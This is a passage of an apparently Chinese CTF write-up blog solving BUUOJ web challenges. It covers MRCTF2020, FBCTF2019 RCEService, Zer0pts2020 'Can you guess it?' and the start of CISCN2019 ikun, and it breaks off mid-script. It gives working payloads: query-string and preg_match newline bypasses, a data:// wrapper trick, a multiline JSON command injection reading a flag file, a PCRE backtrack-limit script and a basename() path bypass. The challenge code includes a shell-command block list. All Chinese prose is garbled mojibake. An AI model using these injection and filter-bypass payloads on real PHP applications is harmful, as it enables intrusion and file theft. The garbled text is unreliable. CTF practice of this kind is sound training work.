title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230412195450258.png" alt="image-20230412195450258"></p><p>ç½‘é¡µæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifè€ƒå¯Ÿ<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>è·å–çš„æ˜¯æœªç»urlè§£ç çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå› æ­¤å°†<code>_</code>urlç¼–ç åå¯ç»•è¿‡ã€‚ï¼ˆurlç¼–ç å¤§å°å†™ä¸æ•æ„Ÿï¼‰</p><p>ç¬¬äºŒä¸ªifè€ƒå¯Ÿ<code>preg_match()</code>åªèƒ½åŒ¹é…å•è¡Œå­—ç¬¦ä¸²ï¼Œä¼šå°†æ¢è¡Œç¬¦åçš„å­—ç¬¦ä¸²å¿½ç•¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412200039405.png" alt="image-20230412200039405"></p><p> <strong>secrettw.php</strong></p><p><img src="../images/image-20230412200134805.png" alt="image-20230412200134805"></p><p><img src="../images/image-20230412200153748.png" alt="image-20230412200153748"></p><p>æºç ç»™è¿™äº›ä¸œè¥¿</p><p>æ§åˆ¶å°æ‰§è¡Œè¾“å‡ºç»“æœ  è¯´æ˜¯<strong>postä¸€ä¸ªMerak</strong></p><p><img src="../images/image-20230412200248976.png" alt="image-20230412200248976"></p><p>è¿™æ˜¯jsfuckç¼–ç </p><p><img src="../images/image-20230412200445109.png" alt="image-20230412200445109"></p><p>ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>çŒœæµ‹<code>getIp()</code>å¯èƒ½é€šè¿‡<code>X-Forwarder-For</code>æˆ–<code>client-ip</code>å¤´å¯ä»¥ç»•è¿‡ã€‚</p><p>å› ä¸ºè¿™é‡Œæç¤ºäº†<strong>â€œLocal access onlyâ€</strong></p><p><code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; )</code>å¯ç”±<code>data:\\</code>ä¼ªåè®®ç»•è¿‡</p><p>è¿™é‡Œçš„è¯<code>php://input</code>åº”è¯¥ä¹Ÿèƒ½ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secrettw.php?2333=data://text/plain,todat+is+a+happy+day</span><br><span class="line">ç©ºæ ¼éœ€è¦urlç¼–ç </span><br></pre></td></tr></table></figure><p><code>change()</code>å‡½æ•°å°†ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œbase64è§£ç ç„¶åè¿›è¡Œç®€å•åŠ å¯†ã€‚</p><p>æˆ‘ä»¬éœ€è¦ä¼ å…¥<code>flag.php</code>æ•…éœ€è¦å…ˆå°†<code>flag.php</code>é€å­—ç¬¦è¿›è¡ŒåŠ å¯†ï¼Œç„¶åè¿›è¡Œbase64ç¼–ç ã€‚</p><p>å¯¹change()çš„è§£ç è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cstr = <span class="string">&quot;flag.php&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cstr)):</span><br><span class="line">    ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(cstr[i])- i*<span class="number">2</span>)</span><br><span class="line">    tmp += ch</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(tmp.encode()))</span><br></pre></td></tr></table></figure><p><strong>æœ€ç»ˆpayload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6ad8a2e0-f0f7-49c9-8087-ac1021dbe1a2.node3.buuoj.cn/secrettw.php?2333=data://text/plain,todat+is+a+happy+day&amp;file=ZmpdYSZmXGI%3D</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230412214146848.png" alt="image-20230412214146848"></p><p>è€ƒå¯Ÿçš„æ˜¯  <strong>sqlç›²æ³¨</strong></p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230412214603190.png" alt="image-20230412214603190"></p><p><strong>çŸ¥è¯†ç‚¹ï¼šPHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ï¼Œå¤šè¡Œç»•è¿‡preg_matchå‡½æ•°</strong></p><p><strong>preg_mathch</strong>åŠ ä¸Š   <code>m</code>   çš„è¯å°±ä¸è¡Œäº†  ï¼Œå› ä¸º<code>m</code>æ˜¯å¤šè¡Œç‹¬ç«‹åŒ¹é…</p><p><strong>é¢˜ç›®æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412215324802.png" alt="image-20230412215324802"></p><p><strong>ç¬¬ä¸€ç§è§£æ³•</strong></p><p>å› ä¸º<code>preg_match</code>åªèƒ½åŒ¹é…ç¬¬ä¸€è¡Œï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é‡‡ç”¨å¤šè¡Œç»•è¿‡ã€‚<br>å› ä¸º<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>ä¿®æ”¹äº†ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„ä½¿ç”¨catå‘½ä»¤ï¼Œ<code>cat</code>å‘½ä»¤åœ¨<code>/bin</code>æ–‡ä»¶å¤¹ä¸‹</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412215628734.png" alt="image-20230412215628734"></p><p><strong>ç¬¬äºŒç§è§£æ³•</strong></p><p>å…³äº<code>preg_match</code>ï¼Œæœ‰pç¥æ›¾ç»è®²çš„<code>PRCE</code>,ä½†æ˜¯è¿™ä¸ªé¢˜ç›®å¤ä¹ ç¯å¢ƒæ˜¯<strong>get</strong>ä¼ å‚ï¼Œè€Œépostï¼Œä¼šå¯¼è‡´414æŠ¥é”™ï¼Œè®°å½•ä¸€ä¸‹åŸé¢˜wpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://challenges.fbctf.com:8085/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a></p><p>è¶…å‡º100ä¸‡æ¬¡çš„è¯ä¼šè¿”å›false  ä»è€Œç»•è¿‡ifåˆ¤æ–­</p><p>è¿™é‡Œçš„è¯æ˜¯ä¸èƒ½ç»•è¿‡  å¼ºç­‰äºçš„   <code>===</code></p><p><code>if(false===0)</code>    è¿™æ ·å°±æ˜¯ä¸èƒ½ç›¸ç­‰äº†</p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p><img src="../images/image-20230412220712263.png" alt="image-20230412220712263"></p><p><strong>æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜çš„è§£æ³•å¹¶ä¸æ˜¯åœ¨è€ƒå¯Ÿå’‹æ ·ç»•è¿‡éšæœºæ•°é‚£é‡Œ</p><p>è€Œæ˜¯è€ƒå¯Ÿè¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™çš„åŒ¹é…banæ‰äº†config.phpã€‚ç„¶åä¼šhighlight_file()ï¼š</p><p>å¯ä»¥å‘ç°è¿™é‡ŒåŠ ä¸Šäº†<strong>basename()</strong> å¯èƒ½æ˜¯ä¸ºäº†è·¨ç›®å½•è¯»æ–‡ä»¶ï¼Œè€Œé—®é¢˜æ­£å¥½å‡ºåœ¨äº†è¿™é‡Œï¼Œæ¼”ç¤º</p><p><strong>å½“æˆ‘è®¿é—®index.phpæ—¶ï¼Œæˆ‘å¯ä»¥åœ¨åé¢åŠ ä¸Šä¸€äº›ä¸œè¥¿ï¼Œæ¯”å¦‚/index.php/config.phpï¼Œè¿™æ ·ä»ç„¶è®¿é—®çš„æ˜¯index.phpï¼Œä½†ç»è¿‡basename()åï¼Œä¼ è¿›highlight_file()å‡½æ•°çš„æ–‡ä»¶åå°±å˜æˆäº†config.phpï¼Œå¦‚æœèƒ½ç»•è¿‡é‚£ä¸ªæ­£åˆ™ï¼Œå°±å¯ä»¥å¾—åˆ°config.phpæºç äº†ï¼Œè€Œé¢˜ç›®å‘Šè¯‰FLAGå°±åœ¨config.phpé‡Œï¼Œè¿™é“é¢˜å°±åšå®Œäº†ã€‚æ‰€ä»¥è¯´ï¼Œé‚£ä¸ªéšæœºæ•°å°±æ˜¯ä¸ªéšœçœ¼æ³•</strong><br><strong>å¯ä»¥å‘ç°å‘ç°ï¼Œè¿™ä¸ªæ­£åˆ™åŒ¹é…äº†config.php/ä¸º$_SERVER[â€˜PHP_SELFâ€™]çš„ç»“å°¾</strong></p><p><img src="../images/image-20230412222258528.png" alt="image-20230412222258528"></p><p>è€å¥—è·¯äº†ï¼Œå¯ä»¥ç”¨%0dä¹‹ç±»çš„æ¥æ±¡æŸ“ç»•è¿‡ï¼Œè¿™æ ·ä»ç„¶è®¿é—®å¾—åˆ°index.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%0d   bcdéƒ½è¡Œ</span><br></pre></td></tr></table></figure><p><strong>å¥½å¤šä¸œè¥¿éƒ½è¡Œ</strong></p><p><strong>ä¸€å †ä¸å¯è§å­—ç¬¦éƒ½è¡Œ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x80 0x81 0x82 0x83 0x84 0x85 0x86 0x87 0x88 0x89 0x8a 0x8b 0x8c 0x8d 0x8e 0x8f 0x90 0x91 0x92 0x93 0x94 0x95 0x96 0x97 0x98 0x99 0x9a 0x9b 0x9c 0x9d 0x9e 0x9f 0xa0 0xa1 0xa2 0xa3 0xa4 0xa5 0xa6 0xa7 0xa8 0xa9 0xaa 0xab 0xac 0xad 0xae 0xaf 0xb0 0xb1 0xb2 0xb3 0xb4 0xb5 0xb6 0xb7 0xb8 0xb9 0xba 0xbb 0xbc 0xbd 0xbe 0xbf 0xc0 0xc1 0xc2 0xc3 0xc4 0xc5 0xc6 0xc7 0xc8 0xc9 0xca 0xcb 0xcc 0xcd 0xce 0xcf 0xd0 0xd1 0xd2 0xd3 0xd4 0xd5 0xd6 0xd7 0xd8 0xd9 0xda 0xdb 0xdc 0xdd 0xde 0xdf 0xe0 0xe1 0xe2 0xe3 0xe4 0xe5 0xe6 0xe7 0xe8 0xe9 0xea 0xeb 0xec 0xed 0xee 0xef 0xf0 0xf1 0xf2 0xf3 0xf4 0xf5 0xf6 0xf7 0xf8 0xf9 0xfa 0xfb 0xfc 0xfd 0xfe 0xff</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412222418112.png" alt="image-20230412222418112"></p><p><strong>$_SERVER[â€˜PHP_SELFâ€™]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œå½“ä½¿ç”¨äº†PATH_INFOæ—¶ï¼Œè¿™ä¸ªå€¼æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥å°è¯•ç”¨/index.php/config.php?sourceæ¥è¯»å–flagã€‚</strong></p><p><strong>ä½†æ˜¯æ­£åˆ™è¿‡æ»¤äº†/config.php/*$/i</strong></p><p><code>basename()</code>å‡½æ•°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.php</span><br><span class="line">var_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™æ ·å°±èƒ½ç»•è¿‡æ­£åˆ™äº†ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3.112.201.75:8003/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230412223240234.png" alt="image-20230412223240234"></p><p>é¢˜ç›®ç»™äº†æç¤º   å°±æ˜¯ç»™ä¹°åˆ°     <code>lv6</code></p><p>ç„¶åå°è¯•å»è´­ä¹°ï¼Œå‘ç°æ‰¾ä¸åˆ°é¡µæ•°ï¼Œç„¶åå°±æŸ¥çœ‹æºç ï¼Œå‘ç°<code>lv5</code>ç­‰éƒ½æ˜¯ç”±<code>lv5.png</code>ç»„æˆï¼Œæ‰€ä»¥å°±æ˜¯å†™ä¸ªè„šæœ¬æ¥éå†ä¸€ä¸‹ï¼Œçœ‹åœ¨å“ªä¹Ÿèƒ½æ‰¾åˆ°<code>lv6.png</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 